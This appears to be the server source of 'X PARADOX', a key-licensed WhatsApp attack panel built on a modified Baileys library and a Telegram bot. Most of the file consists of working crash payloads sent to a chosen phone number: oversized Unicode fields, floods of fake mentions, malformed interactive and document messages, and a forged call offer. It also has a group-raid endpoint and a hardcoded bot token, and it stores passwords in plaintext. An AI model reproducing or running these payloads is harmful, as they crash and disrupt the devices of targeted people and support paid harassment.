const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);

process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed')
  )) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed')
  )) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("xbaileys");

const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino');
const axios = require('axios');
const vm = require('vm');
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const DATABASE_DIR = path.join(__dirname, 'database');
const { Client } = require('ssh2');
const DB_PATH = path.join(DATABASE_DIR, "database.json");
let activeKeys = {};
const KEY_FILE = path.join(DATABASE_DIR, 'keyList.json');
const bugs = [
  { bug_id: "fc", bug_name: "FORCLOSE INFINITY" },
  { bug_id: "call", bug_name: "FORCLOSE CALL" },
  { bug_id: "delay", bug_name: "DELAY INVISIBLE" },
  { bug_id: "ios", bug_name: "IOS CRASH" },
  { bug_id: 'andro', bug_name: "BLANK ANDRO" },
  { bug_id: "blank", bug_name: "BLANK ANDRO X IOS" },
  { bug_id: "clear", bug_name: "CLEAR FC INFINITY" },
  { bug_id: "tes", bug_name: "DOZER X PENDING INVISIBLE" }
];
const tqto = [
  {
   name: "</ᴄᴇᴏ · ᴇʟʟ>",
   status: "Developer",
   ppUrl: "https://files.catbox.moe/kzcm7v.jpg",
   contac: "t.me/primroseell"
  },
  {
   name: "𝖝𝖕 𝖎𝖓𝖋𝖔𝖗𝖒𝖆𝖙𝖎𝖔𝖓",
   status: "Channel Information",
   ppUrl: "https://files.catbox.moe/75fgqg.jpg",
   contac: "t.me/ellexxp"
  },
  {
   name: "ニ Xatanical",
   status: "Support",
   ppUrl: "https://files.catbox.moe/nfu1pi.jpg",
   contac: "t.me/Xatanicvxii"
  },
  {
   name: "Sleepin' Qwerty",
   status: "Pedo Telkuat Di Bumi",
   ppUrl: "https://files.catbox.moe/a8q3yp.jpg",
   contac: "t.me/yuukeyd7eppeli"
  },
  {
   name: "𝗪𝗢𝗟𝗙",
   status: "Support",
   ppUrl: "https://files.catbox.moe/bp7fh5.jpg",
   contac: "t.me/Gabrieltzyproooool"
  },
  { 
   name: "</𝐃𝐚𝐫𝐤𝐧𝐞𝐬𝐬>",
   status: "Support",
   ppUrl: "https://files.catbox.moe/cwiygz.jpg",
   contac: "t.me/Darkness_Reals1"
   }
];
let cncActive = true;
const LOG_FILE = path.join(DATABASE_DIR, 'logUser.txt');

if (fs.existsSync(KEY_FILE)) {
  sikmanuk = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
} else {
  sikmanuk = [];
  fs.writeFileSync(KEY_FILE, JSON.stringify(sikmanuk, null, 2));
}

fs.watchFile(KEY_FILE, () => {
  sikmanuk = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
});

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

const TOKEN = "8496021297:AAH1Et29IKU4Tw-nNEQTcuPwU5c6hTyIt9Y";
const bot = new TelegramBot(TOKEN, { polling: true });
const OWNER_ID = 8448082521;
const ID_GROUP = [OWNER_ID];
const ID_GROUP_UTAMA = [OWNER_ID];

function sendToGroups(text, options = {}) {
  for (const groupid of ID_GROUP) {
    bot.sendMessage(groupid, text, options).catch();
  }
}

function sendToGroupsUtama(text, options = {}) {
  for (const groupid of ID_GROUP_UTAMA) {
    bot.sendMessage(groupid, text, options).catch();
  }
}

const PORT = 2005;
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
const rateLimitMap = {};

function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  return expired;
}
const ADMINS_FILE = path.join(__dirname, 'database', 'admins.json');
const DEVELOPER_IDS = [8448082521];
function loadAdmins() {
  try {
    if (!fs.existsSync(ADMINS_FILE)) {
      const defaultData = {
        owners: [],
        admins: [],
        resellers: []
      };
      fs.writeFileSync(ADMINS_FILE, JSON.stringify(defaultData, null, 2));
      return defaultData;
    }
    const data = fs.readFileSync(ADMINS_FILE, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading admins file:', error);
    return { owners: [], admins: [], resellers: [] };
  }
}

function saveAdmins(data) {
  try {
    const dir = path.dirname(ADMINS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(ADMINS_FILE, JSON.stringify(data, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving admins file:', error);
    return false;
  }
}

function isDeveloper(userId) {
  return DEVELOPER_IDS.includes(Number(userId));
}

function isOwner(userId) {
  const data = loadAdmins();
  return data.owners.includes(Number(userId));
}

function isAdmin(userId) {
  const data = loadAdmins();
  return data.admins.includes(Number(userId));
}

function isReseller(userId) {
  const data = loadAdmins();
  return data.resellers.includes(Number(userId));
}

function hasAccess(userId) {
  return isDeveloper(userId) || isOwner(userId) || isAdmin(userId) || isReseller(userId);
}

function getUserStatus(userId) {
  if (isDeveloper(userId)) return "Developer";
  if (isOwner(userId)) return "Owner";
  if (isAdmin(userId)) return "Admin";
  if (isReseller(userId)) return "Reseller";
  return "No Access";
}
const spamCooldown = {};
const cooldowns = {};

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/5sf99c.jpg",
    title: "X PARADOX V6.0",
    desc: "Buy Akses Hubungi : @primroseell"
  },
  {
    image: "https://files.catbox.moe/c6m0a3.jpg",
    title: "X PARADOX",
    desc: "JOIN CHANNEL"
  }
];

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);
  if (existingSession && existingSession.androidId !== androidId) {
    console.log(`[📱] Device login baru, override session untuk ${username}`);
  }
  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  
  if (!userKey) {
    return res.json({ valid: false, reason: "session" });
  }
  if (userKey.androidId !== androidId) {
    return res.json({ valid: false, reason: "device" });
  }
  if (!user) {
    return res.json({ valid: false });
  }
  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }
  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

async function invisibleSpam(sock, target) {
    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
    
    for (const x of type) {
        const enty = Math.floor(Math.random() * type.length);
        const msg = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "\u0003",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: x,
                                paramsJson: "\x10".repeat(1000000),
                                version: 3
                            },
                            entryPointConversionSource: type[enty]
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );
        
        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );
        
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}
async function rpnm(sock, target) {
  await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "7eppeli.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(20000),
          title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/YuukeyD7eppeli",
         mediaUrl: "https://t.me/YuukeyD7eppeli",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        }
      }
    }
  }, {
   participant: { jid: target }
 });
}
async function docIos(sock, target) {
  const quotedios = {
    key: {
      remoteJid: "13135559098@s.whatsapp.net",
      participant: "13135559098@s.whatsapp.net",
      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
    },
    message: {
      buttonsResponseMessage: {
        selectedButtonId: "x",
        type: 1,
        response: {
          selectedDisplayText: '\n'.repeat(50000)
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
      fileLength: 999999999,
      pageCount: 999999999,
      mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
      fileName: "x" + "𑇂𑆵𑆴𑆿".repeat(60000),
      fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
      directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1715880173
    }
  }), { quoted: quotedios });
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });
    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
}
async function PlainCall(sock, number) {
    try {
      const jid = String(number).includes("@s.whatsapp.net")
            ? String(number)
            : `${String(number).replace(/\D/g, "")}@s.whatsapp.net`;

        const mutexMemek = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async (prev) => {
                        try { await prev; } catch {}
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        const MamakLoJing = mutexMemek();
        const xrellyBuffer = (buf) =>
            Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        const yntkts = encodeSignedDeviceIdentity;

        sock.createParticipantNodes = async (
            recipientJids,
            message,
            extraAttrs,
            dsmMessage
        ) => {
            if (!recipientJids.length)
                return { nodes: [], shouldIncludeDeviceIdentity: false };

            const patched =
                (await sock.patchMessageBeforeSending?.(
                    message,
                    recipientJids
                )) ?? message;

            const ywdh = Array.isArray(patched)
                ? patched
                : recipientJids.map((j) => ({
                      recipientJid: j,
                      message: patched
                  }));

            const { id: meId, lid: meLid } = sock.authState.creds.me;
            const jembut = meLid ? jidDecode(meLid)?.user : null;

            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(
                ywdh.map(async ({ recipientJid: j, message: msg }) => {
                    const { user: numberUser } = jidDecode(j);
                    const { user: ownUser } = jidDecode(meId);

                    const isOwn =
                        numberUser === ownUser || numberUser === jembut;

                    const y = j === meId || j === meLid;
                    if (dsmMessage && isOwn && !y) msg = dsmMessage;

                    const bytes = xrellyBuffer(
                        yntkts ? yntkts(msg) : Buffer.from([])
                    );

                    return MamakLoJing.mutex(j, async () => {
                        const { type, ciphertext } =
                            await sock.signalRepository.encryptMessage({
                                jid: j,
                                data: bytes
                            });

                        if (type === "pkmsg")
                            shouldIncludeDeviceIdentity = true;

                        return {
                            tag: "to",
                            attrs: { jid: j },
                            content: [
                                {
                                    tag: "enc",
                                    attrs: { v: "2", type, ...extraAttrs },
                                    content: ciphertext
                                }
                            ]
                        };
                    });
                })
            );

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        let devices = [];

        try {
            devices = (
                await sock.getUSyncDevices([jid], false, false)
            ).map(
                ({ user, device }) =>
                    `${user}${device ? ":" + device : ""}@s.whatsapp.net`
            );
        } catch {
            devices = [jid];
        }

        try {
            await sock.assertSessions(devices);
        } catch {}

        let { nodes: destinations, shouldIncludeDeviceIdentity } = {
            nodes: [],
            shouldIncludeDeviceIdentity: false
        };

        try {
            const created = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            destinations = created?.nodes ?? [];
            shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
        } catch {
            destinations = [];
            shouldIncludeDeviceIdentity = false;
        }

        const wtfXrL = {
            tag: "call",
            attrs: {
                to: jid,
                id:
                    sock.generateMessageTag?.() ??
                    crypto.randomBytes(8).toString("hex"),
                from:
                    sock.user?.id || sock.authState?.creds?.me?.id
            },
            content: [
                {
                    tag: "offer",
                    attrs: {
                        "call-id": crypto
                            .randomBytes(16)
                            .toString("hex")
                            .slice(0, 64)
                            .toUpperCase(),
                        "call-creator":
                            sock.user?.id || sock.authState?.creds?.me?.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },
                        { tag: "net", attrs: { medium: "3" } },
                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([
                                1, 5, 247, 9, 228, 250, 1
                            ])
                        },
                        { tag: "encopt", attrs: { keygen: "2" } },
                        {
                            tag: "destination",
                            attrs: {},
                            content: destinations
                        }
                    ]
                }
            ]
        };

        if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
            try {
                const deviceIdentity = encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                );

                wtfXrL.content[0].content.push({
                    tag: "device-identity",
                    attrs: {},
                    content: deviceIdentity
                });
            } catch (e) {}
        }

        await sock.sendNode(wtfXrL);

    } catch (e) {}
}
async function blankIos(sock, target) {
  await sock.sendMessage(
    target,
    {
      text: "*X PARADOX*",
      contentText: "X PARADOX",
      footer: "X PARADOX",
      viewOnce: true,
      buttons: [
        {
          buttonId: "🦠",
          buttonText: {
            displayText: "🦠"
          },
          type: 4,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: "᬴".repeat(60000),
              sections: []
            })
          }
        }
      ],
      headerType: 1
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}
async function DelayCarousel(sock, target) {
    try {
        const videoMessage = {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "r6rKspL7KzRZvoCBkbkAgNTbbZAz3EzCT7Jo7vivhW0=",
            fileLength: "10000000",
            mediaKey: "GHCUsF8us7byHgPCA8lVDELN67jra3I3lgRZXCCRc0s=",
            fileEncSha256: "VzWEuluQdKOio+HmwLAoi8/f4md4ppgsCoIocolbNRI=",
            directPath: "/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1767791229",
            streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
            thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
            thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
            thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
            annotations: [
                {
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "1942620729844671",
                            songId: "432395962368430",
                            author: "Yuukey Da",
                            title: "Уччкеу Дїшауи Жіьпарріп",
                            artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
                            artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
                            artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
                            artistAttribution: "",
                            countryBlocklist: "",
                            isExplicit: false,
                            artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
                        }
                    },
                    embeddedAction: true
                }
            ]
        };

        const msg = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            header: {
                                title: "\u0000",
                                hasMediaAttachment: true,
                                videoMessage
                            },
                            contextInfo: {
                                mentionedJid: [
                                    target,
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () =>
                                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                    )
                                ],
                                remoteJid: " X "
                            },
                            carouselMessage: {
                                cards: Array.from({ length: 15 }, () => ({
                                    header: {
                                        title: "\u0000",
                                        hasMediaAttachment: true,
                                        videoMessage
                                    },
                                    contextInfo: {
                                        mentionedJid: [
                                            target,
                                            "0@s.whatsapp.net",
                                            ...Array.from({ length: 1900 }, () =>
                                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                            )
                                        ],
                                        remoteJid: " X "
                                    },
                                    nativeFlowMessage: {
                                        messageParamsJson: "({".repeat(9000)
                                    }
                                }))
                            }
                        }
                    }
                }
            },
            {
                messageId: null,
                participant: {
                    jid: target
                }
            }
        );

        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );

    } catch (e) {
       console.log(e.message)
    }
}
async function execute(sock, target) {
    const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    NewsletterAdminInviteMessage: {
                        newsletterJid: "1@newsletter",
                        newsletterName: "᬴᬴᬴".repeat(50000),
                        jpegThumbnail: "/9j//gAQTGF2YzU5LjM3LjEwMAD/2wBDAAgEBAQEBAUFBQUFBQYGBgYGBgYGBgYGBgYHBwcICAgHBwcGBgcHCAgICAkJCQgICAgJCQoKCgwMCwsODg4RERT/xAB+AAEBAQEBAAAAAAAAAAAAAAAHBgQDBQEBAQEBAAAAAAAAAAAAAAAAAgAEARAAAgECBAQEAgcBAQAAAAAAAgEDBBEhABIFEzMxBiNIbGysZF0s3M3FFERAAEDAgYCAwEAAAAAAAAAAAEAAwIRESIEMzJBIbHwcnGBYf/AABEIABIAIAMBIgACEQADEQD/2gAMAwEAAhEDEQA/AA2Pbq2cI3HGbUhaUVmx62xdrL1zrotoq6qWCKnE5iqJXDDay4kiYixG7wxIetuueMU1VGYxRTSDZpWEiQ6n9n/7mr7DVDJvNC5TKEaarc4FIkeqR8MzExDoOuMkiC7x6Z3MsNnCRj4Eq0oPpNqM3JiAubFZD5f79Q1YUdbTFTzSxxyxojjITjlh40ZgYEUZAcfyEhJryz4G7bedLVSgnezWKd07inh+uWcg7a7gm2Ok3KVSQbEFRaqqKoaN1URENtuYAm+GMpkVNYuLpIhKwYrjzi7Mp9wLbJKWkpdjoKKCSnRNRRxzkz18QJLgiunZa9LSV/k3lPZOc9kSD/TenPdq3SdBbhgO4SrUd9UQzTt8X1+uaTtDxYH53JZm6fxfX65pO0PEg+5ZspcrmW12vkFRNv2nd3/73j54E1+WULmX7vLWlKT3C0QPUfyd+G8bvG+T0ukX78vxPKFzH/zKl/rp/wCN52u2Z94U9rP/AL5K/9k=",
                        caption: "᬴᬴᬴".repeat(50000),
                        inviteExpiration: null,
                        contextInfo: {
                            mentionedJid: [
                                target,
                                "0@s.whatsapp.net",
                                "13135559098@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () =>
                                    `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                )
                            ],
                            remoteJid: "X",
                            disappearingMode: {
                                initiator: "INITIATED_BY_OTHER",
                                trigger: "ACCOUNT_SETTING"
                            },
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: 7205
                                }
                            }
                        }
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        }
    });
}
app.get("/tq", async (req, res) => {
  res.json({ status: true, result: tqto });
});
app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });
  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
